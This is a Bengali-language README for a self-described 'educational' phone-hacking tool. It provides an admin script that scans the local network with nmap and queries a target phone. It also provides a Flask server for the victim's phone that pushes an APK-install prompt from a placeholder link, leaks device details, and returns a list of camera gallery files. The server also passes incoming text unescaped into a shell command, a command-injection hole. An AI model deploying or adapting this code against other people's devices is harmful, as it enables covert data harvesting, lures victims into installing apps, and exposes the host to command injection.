# Local-Net-device-hack


---

## ** টুলসের ফিচারস (Educational, Non-Root Based):**

1. **Target Finder using `nmap`**
2. **Target IP নির্বাচন করে রিকুয়েস্ট পাঠানো**
3. **টার্গেট ডিভাইসে Flask Server – Install Prompt + Device Info**
4. **APK Install হলে – টার্গেটের গ্যালারির ফাইল লিস্ট ফেরত পাঠাবে**
5. **Live Info Receive – Admin side**

---

## **Phase 1: Install প্রয়োজনীয় Tools (Termux)**

```bash
pkg update -y
pkg install nmap -y
pkg install python -y
pip install flask requests
```

---

## **Phase 2: Admin Side Tool (`admin_tool.py`)**

```python
import os
import requests
import json

def scan_with_nmap():
    print("\n[+] আপনার নেটওয়ার্ক স্ক্যান চলছে...\n")
    os.system("nmap -sn 192.168.0.0/24")

def send_install_request(ip):
    url = f"http://{ip}:5000/install_prompt"
    try:
        response = requests.post(url, json={"message": "আপনি কি অ্যাপস ইনস্টল করতে চান?"})
        print("\n[+] রিকুয়েস্ট পাঠানো হয়েছে!")
        info = response.json()
        print(f"\n[+] টার্গেট ইনফো:\nBrand: {info['brand']}\nModel: {info['model']}\nHostname: {info['hostname']}")
    except:
        print("\n[!] টার্গেট ডিভাইস অ্যাক্সেস করা যাচ্ছে না!")

def get_gallery(ip):
    url = f"http://{ip}:5000/gallery"
    try:
        response = requests.get(url)
        files = response.json().get("gallery", [])
        print("\n[+] গ্যালারির ফাইল লিস্ট:\n")
        for file in files:
            print(file)
    except:
        print("\n[!] গ্যালারি ডেটা আনতে সমস্যা হচ্ছে।")

print("শিক্ষামূলক উদ্দেশ্যে ব্যবহার করবেন এই টুলস,👇")
print("1: Target Device Find (nmap)")
print("2: Start Request")
print("3: Get Gallery Files")

choice = input("Enter choice: ")

if choice == "1":
    scan_with_nmap()

elif choice == "2":
    ip = input("Enter target IP: ")
    send_install_request(ip)

elif choice == "3":
    ip = input("Enter target IP: ")
    get_gallery(ip)
```

---

## **Phase 3: Target Flask Server (Target side, `server.py`)**

```python
from flask import Flask, request, jsonify
import os
import platform
import socket
import glob

app = Flask(__name__)

@app.route('/install_prompt', methods=['POST'])
def prompt_install():
    msg = request.json.get("message")
    
    os.system(f'termux-notification --title "রিকুয়েস্ট" --content "{msg}" '
              '--button1-text "Yes" '
              '--button1-action "am start -a android.intent.action.VIEW -d https://example.com/your_apk.apk" '
              '--button2-text "No" --button2-action "exit"')

    hostname = socket.gethostname()
    return jsonify({
        "brand": platform.system(),
        "model": platform.machine(),
        "hostname": hostname
    })

@app.route('/gallery', methods=['GET'])
def get_gallery():
    files = glob.glob("/storage/emulated/0/DCIM/Camera/*.jpg")  # Only JPG for demo
    return jsonify({"gallery": files})

app.run(host="0.0.0.0", port=5000)
```

---

## **ব্যবহার পদ্ধতি:**

### **টার্গেট মোবাইলে (Termux)**
```bash
pip install flask
python3 server.py
```

### **অ্যাডমিন মোবাইলে (Termux)**
```bash
python3 admin_tool.py
```

---

## **Note:**
- গ্যালারি অ্যাক্সেস কাজ করবে যদি Flask server চালানোর আগে storage permission দেয়া থাকে (`termux-setup-storage`)
  

---
